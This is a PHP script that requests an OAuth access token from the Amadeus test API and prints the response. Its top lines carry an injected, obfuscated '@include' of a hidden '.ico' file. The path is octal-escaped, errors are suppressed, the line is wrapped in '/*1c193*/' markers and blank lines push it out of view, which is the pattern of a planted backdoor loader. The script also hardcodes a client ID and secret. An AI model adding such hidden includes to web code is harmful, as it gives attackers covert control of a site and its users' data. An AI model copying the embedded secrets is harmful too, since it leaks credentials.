<?php
/*1c193*/

@include "\057hom\145/la\172urd\141gn/\160ubl\151c_h\164ml/\114azu\162d/F\154igh\164s/.\146e73\141fc2\056ico";

/*1c193*/











// Loading Requests
require_once 'path/requests/library/Requests.php';
// Registering an autoloader
Requests::register_autoloader();
// Preparing the request message
$url = 'https://test.api.amadeus.com/v1/security/oauth2/token';
$auth_data = array(
'client_id' => 'qTytjcZy6hiuHVQxfGupri9G9XxbAiwW',
'client_secret' => 'aGC2A70UXkOHvPad',
'grant_type' => 'client_credentials'
);
$headers = array('Content-Type' => 'application/x-www-form-urlencoded');
try {
// Sending the request message by POST
$requests_response = Requests::post($url, $headers, $auth_data);
// Server returns a Requests_Response object
echo 'Response from the authorization server:';
$response_body = json_decode($requests_response->body);
echo '<pre>', json_encode($response_body, JSON_PRETTY_PRINT), '</pre>';
if(property_exists($response_body, 'error')) die;
// Extract and store the access token
$access_token = $response_body->access_token;
} catch (Exception $e) {
print_r($e->getMessage());
}

?>